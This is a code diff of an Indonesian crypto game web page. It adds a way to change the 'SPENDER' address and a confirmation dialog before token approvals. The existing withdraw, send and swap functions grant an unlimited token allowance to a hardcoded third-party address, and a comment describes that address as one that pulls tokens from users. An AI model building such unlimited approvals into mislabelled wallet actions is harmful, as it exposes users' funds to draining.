@@ -43,6 +43,7 @@ body{background:#000;color:#fff;padding-bottom:80px}
 .status-error{background:#ff4444;color:#fff}
 .status-info{background:#1e90ff;color:#fff}
 .status-warning{background:#ff9800;color:#fff}
+.small-note{font-size:11px;color:#bbb;margin-top:8px}
 </style>
 </head>
 <body>
@@ -78,6 +79,9 @@ body{background:#000;color:#fff;padding-bottom:80px}
     <div style="color:#aaa;font-size:12px;margin-top:10px">ALAMAT WALLET</div>
     <input type="text" id="inputAlamat" class="input" placeholder="Tempel alamat wallet tujuan" readonly>
     <button class="btn btn-biru" id="btnPaste">📋 PASTE ALAMAT</button>
+    <div class="small-note">SPENDER saat ini: <span id="currentSpender" style="color:gold">0x25df...0131</span></div>
+    <input type="text" id="inputSpender" class="input" placeholder="Ganti SPENDER (alamat kontrak)" style="margin-top:8px">
+    <button class="btn btn-biru" id="btnSetSpender">🔧 SET SPENDER</button>
   </div>
   <div class="grid-2">
     <div class="btn-menu" id="btnKirim">📤<br><b>Kirim GRD</b></div>
@@ -121,9 +125,8 @@ const CA = "0x4847F2E8dD63ba03b9C4f935BdEd95bEc1bcaCb4";
 const CHAIN_ID = '0x38';
 const USDT = "0x55d398326b99059fF775485246999027B3197955"; // USDT BSC
 
-// NOTE: SPENDER harus diisi dengan address kontrak/perantara yang akan menarik token dari user, mis. router PancakeSwap atau kontrak "bank".
-// SPENDER di-set sesuai permintaan Anda:
-const SPENDER = "0x25df1e6e16370cbfb0578b0e30c00bcde0d0f131";
+// SPENDER bisa diubah pengguna lewat UI
+let SPENDER = "0x25df1e6e16370cbfb0578b0e30c00bcde0d0f131";
 
 // ABI LENGKAP dengan approve, transfer, decimals, allowance
 const ABI = [
@@ -183,10 +186,13 @@ document.addEventListener('DOMContentLoaded', function(){
   document.getElementById('btnWithdraw').addEventListener('click', withdrawBeneran);
   document.getElementById('btnPaste').addEventListener('click', pasteAlamat);
   document.getElementById('btnSalin').addEventListener('click', salinReferral);
+  document.getElementById('btnSetSpender').addEventListener('click', setSpenderFromInput);
 
   document.querySelectorAll('.nav-item').forEach(item=>{
     item.addEventListener('click', (e)=>gantiHalaman(e.currentTarget.dataset.page, e.currentTarget));
   });
+
+  document.getElementById('currentSpender').innerText = SPENDER;
 })
 
 function tap(){
@@ -298,6 +304,16 @@ async function connectWithWalletConnect(){
   });
 }
 
+function setSpenderFromInput(){
+  const val = document.getElementById('inputSpender').value.trim();
+  if(!val) return showStatus('Masukkan alamat SPENDER', 'error');
+  if(!/^0x[a-fA-F0-9]{40}$/.test(val)) return showStatus('Alamat SPENDER tidak valid', 'error');
+  SPENDER = val;
+  document.getElementById('currentSpender').innerText = SPENDER;
+  document.getElementById('inputSpender').value = '';
+  showStatus('✅ SPENDER diperbarui: '+SPENDER, 'success');
+}
+
 // 1. KLAIM = PINDAH KE DANA
 function klaimKeDana(){
   if(saldoGame < 100) return alert("Minimal 100 GRD");
@@ -318,6 +334,11 @@ async function getAmountBN(amountFloat){
 
 function getMaxUint256(){
   return web3.utils.toBN(2).pow(web3.utils.toBN(256)).sub(web3.utils.toBN(1)).toString();
+}
+
+// Ask user to confirm approve action
+function confirmApprove(jumlah){
+  return confirm('Anda akan memberikan APPROVAL ke '+SPENDER+' untuk '+formatAngka(jumlah)+' GRD.\nLanjutkan?');
 }
 
 // 2. WITHDRAW = KIRIM DARI KONTRAK KE WALLET (DENGAN APPROVAL FLOW)
@@ -343,7 +364,16 @@ async function withdrawBeneran(){
     let currentAllowance = await contract.methods.allowance(walletAddress, SPENDER).call();
     currentAllowance = web3.utils.toBN(currentAllowance);
 
+    const jumlah = Math.floor(saldoClaim);
+
     if(currentAllowance.lt(amountBN)){
+      // Confirm with user before approving
+      if(!confirmApprove(jumlah)){
+        document.getElementById('loading').innerText = "";
+        showStatus('⏸️ Approval dibatalkan oleh pengguna', 'warning');
+        return;
+      }
+
       // Perlu approve dulu
       showStatus("⏳ Sedang approval token... (tanda tangan di wallet)", "warning");
       let approveAmount = getMaxUint256(); // unlimited
@@ -355,9 +385,6 @@ async function withdrawBeneran(){
 
     // STEP 3: Transfer token
     showStatus("Step 3/3: Transfer token... (tanda tangan di wallet)", "info");
-
-    // Simpan jumlah sebelum reset supaya pesan sukses menampilkan nilai yang benar
-    const jumlah = Math.floor(saldoClaim);
 
     // NOTE: Ini memanggil token.transfer dari wallet user. Jika token yang dimaksud disimpan
     // di kontrak "bank"/server, frontend harus memanggil fungsi withdraw pada kontrak bank,
@@ -411,7 +438,14 @@ async function kirimBeneran(){
     let currentAllowance = await contract.methods.allowance(walletAddress, SPENDER).call();
     currentAllowance = web3.utils.toBN(currentAllowance);
 
+    const jumlahKirim = Math.floor(saldoClaim);
+
     if(currentAllowance.lt(amountBN)){
+      if(!confirmApprove(jumlahKirim)){
+        document.getElementById('loading').innerText = "";
+        showStatus('⏸️ Approval dibatalkan oleh pengguna', 'warning');
+        return;
+      }
       showStatus("⏳ Approval token...", "warning");
       let approveAmount = getMaxUint256();
       await contract.methods.approve(SPENDER, approveAmount).send({from: walletAddress});
@@ -420,7 +454,6 @@ async function kirimBeneran(){
     let tx = await contract.methods.transfer(alamat, amountBN.toString()).send({from:walletAddress});
     document.getElementById('loading').innerText = "";
 
-    let jumlahKirim = Math.floor(saldoClaim);
     saldoClaim = 0;
 
     showStatus("✅ SUKSES KIRIM "+formatAngka(jumlahKirim)+" GRD | TX: "+(tx && tx.transactionHash ? tx.transactionHash.slice(0,16)+"..." : "(no-tx)"), "success");
@@ -445,7 +478,14 @@ async function tukarUSDT(){
     let currentAllowance = await contract.methods.allowance(walletAddress, SPENDER).call();
     currentAllowance = web3.utils.toBN(currentAllowance);
 
+    const jumlah = Math.floor(saldoClaim);
+
     if(currentAllowance.lt(amountBN)){
+      if(!confirmApprove(jumlah)){
+        document.getElementById('loading').innerText = "";
+        showStatus('⏸️ Approval dibatalkan oleh pengguna', 'warning');
+        return;
+      }
       showStatus("⏳ Approval token...", "warning");
       let approveAmount = getMaxUint256();
       await contract.methods.approve(SPENDER, approveAmount).send({from: walletAddress});
